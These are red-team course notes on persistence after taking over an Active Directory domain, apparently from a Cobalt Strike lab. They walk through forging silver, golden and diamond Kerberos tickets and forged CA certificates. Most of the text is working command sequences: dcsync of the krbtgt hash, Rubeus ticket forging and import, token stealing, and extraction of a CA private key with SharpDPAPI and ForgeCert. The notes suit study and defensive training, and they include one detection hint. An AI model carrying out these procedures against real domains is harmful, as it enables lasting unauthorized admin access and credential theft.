# Domain Dominance

Once an attacker achieves a very high level of privilege in the domain, such as Domain or Enterprise Admin, it's very difficult for a defending organisation to recover or even consider the forest as "clean" again.  Attackers with this access can extract credential material from the domain and use it to re-obtain DA-level access at any time.  The majority of these credentials are never changed, which grants practically unlimited access.

## Silver Tickets

Forged service ticket signed using the secret keys of a computer. You can forge a TGS for any user to any service on that machine, which is useful for short/medium-term persistence. By default, computer passwords change every 30 days, at which time you must get the new secrets to continue making silver tickets. Tickets are forged, and can be generated by the attacker and imported into a Beacon session.

1: Dump Kerberos keys from Workstation 1 from a SYSTEM Beacon.

2: On the attacking machine, use Rubeus to forge a service ticket for nlamb and the CIFS service:

    PS C:\Users\Attacker> Rubeus.exe silver /service:cifs/wkstn-1.dev.cyberbotic.io /aes256:3ad3c... /user:nlamb /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /nowrap

3: Import the ticket:

    beacon> getuid
    [*] You are DEV\bfarmer (admin)
    beacon> ls \\wkstn-1.dev.cyberbotic.io\c$
    [-] could not open \\wkstn-1.dev.cyberbotic.io\c$\*: 5 - ERROR_ACCESS_DENIED
    beacon> execute-assembly Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFXD...
    beacon> steal_token 5668
    [+] Impersonated DEV\bfarmer
    beacon> ls \\wkstn-1.dev.cyberbotic.io\c$

Useful ticket combinations:

* psexec:	HOST & CIFS
* winrm:	HOST & HTTP
* dcsync (DCs only):	LDAP

## Golden Tickets

Forged TGT signed by the domain's krbtgt account. Where a silver ticket can be used to impersonate any user, it's limited to either that single service or to any service but on a single machine. A golden ticket can be used to impersonate any user, to any service, on any machine in the domain, and the credentials are never changed automatically. For that reason, the krbtgt NTLM/AES hash is probably the single most powerful secret you can obtain (and is why you see it used in dcsync examples so frequently). 

Because domain controllers don't track TGTs they have legitimately issued, they will accept TGTs that are encrypted with their own krbtgt hash.

One way to detect the use of golden tickets is to look for TGS-REQs that have no corresponding AS-REQ. 

1: Obtain the krbtgt hash by using dcsync from the context of a domain admin:

    beacon> dcsync dev.cyberbotic.io DEV\krbtgt

2: Forge the ticket offline using Rubeus:

    PS C:\Users\Attacker> Rubeus.exe golden /aes256:51d7f3... /user:nlamb /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /nowrap

3: Import into a logon session to use:

    beacon> execute-assembly Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFLz...
    beacon> steal_token 5060
    beacon> run klist
    beacon> ls \\dc-2.dev.cyberbotic.io\c$

## Diamond Tickets

Made by modifying the fields of a legitimate TGT that was issued by a DC. This is achieved by requesting a TGT, decrypting it with the domain's krbtgt hash, modifying the desired fields of the ticket, then re-encrypting it. This overcomes the aforementioned shortcoming of a golden ticket because any TGS-REQs will have a preceding AS-REQ.

1: Prove we have no access to the DC:

    beacon> getuid
    beacon> ls \\dc-2.dev.cyberbotic.io\c$

2: Create the diamond ticket:

    beacon> execute-assembly Rubeus.exe diamond /tgtdeleg /ticketuser:nlamb /ticketuserid:1106 /groups:512 /krbkey:51d7... /nowrap

where:

    /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the current user without needing to know their password, NTLM/AES hash, or elevation on the host.
    /ticketuser is the username of the user to impersonate.
    /ticketuserid is the domain RID of that user.
    /groups are the desired group RIDs (512 being Domain Admins).
    /krbkey is the krbtgt AES256 hash.

Rubeus describe will now show that this is a TGT for the target user.

    PS C:\Users\Attacker> Rubeus.exe describe /ticket:doIFYj...

## Forged Certificates

AD CS roles may be on separate servers and not on the DC, often not with the same sensitivity as DCs. Only EAs and DAs can access/manage DCs, but lower roles e.g. server admins can access the CAs. Gaining LA to a CA allows an attacker to extract the CA private key, which can be used to sign a forged cert (like the krbtgt hash being able to sign a forged TGT). The default validity period is 5 years, but can be changed during setup.

1: Once on a CA, SharpDPAPI can extract the private keys:

    beacon> run hostname
    dc-2
    beacon> getuid
    [*] You are NT AUTHORITY\SYSTEM (admin)
    beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe certificates /machine

2: Save the private key and cert to a .pem file and convert it to a .pfx with openssl.  

3: Build the forged certificate with ForgeCert:

    PS C:\Users\Attacker> ForgeCert.exe --CaCertPath .\Desktop\sub-ca.pfx --CaCertPassword pass123 --Subject "CN=User" --SubjectAltName "nlamb@cyberbotic.io" --NewCertPath .\Desktop\fake.pfx --NewCertPassword pass123

Though SubjectAltName can be anything, the user does need to be present in AD. Use Rubeus to request a legitimate TGT with this forged certificate:

    beacon> execute-assembly Rubeus.exe asktgt /user:nlamb /domain:dev.cyberbotic.io /enctype:aes256 /certificate:MIACA... /password:pass123 /nowrap

Can forge user and machine certs. Use this with the S4U2self trick to gain access to any machine or service in the domain.


